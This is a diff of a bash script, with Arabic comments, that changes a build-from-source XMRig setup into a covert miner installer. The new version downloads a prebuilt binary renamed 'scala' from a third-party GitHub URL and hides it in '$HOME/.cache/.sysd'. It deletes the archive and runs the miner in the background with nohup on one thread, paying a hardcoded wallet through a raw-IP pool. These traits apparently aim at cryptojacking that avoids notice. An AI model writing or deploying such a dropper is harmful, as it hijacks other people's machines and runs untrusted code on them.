@@ -1,19 +1,20 @@
 #!/bin/bash
 
-# إنشاء مجلد العمل
-mkdir -p ~/xmrig-build
-cd ~/xmrig-build
+# إعداد بيانات المحفظة والمعدّن
+WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
+WORKER="arm"
+POOL="45.155.102.89:443"
+THREADS=1
+# مجلد العمل
+WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
+mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
-# تحميل xmrig
-if [ ! -d "xmrig" ]; then
-    git clone https://github.com/xmrig/xmrig.git
-fi
+# تحميل النسخة الجاهزة من XMRig (Linux x64)
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
 
-# بناء xmrig
-cd xmrig
-mkdir -p build && cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release
-make -j$(nproc)
+# فك الضغط
+tar -xvf scala.tar.gz --strip=1
+rm scala.tar.gz
 
-# بدء التعدين في جلسة screen جديدة
-screen -dmS miner ./xmrig -o 45.155.102.89:443 -u 4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR -k --tls
+# تشغيل المعدّن في الخلفية باستخدام nohup
+nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
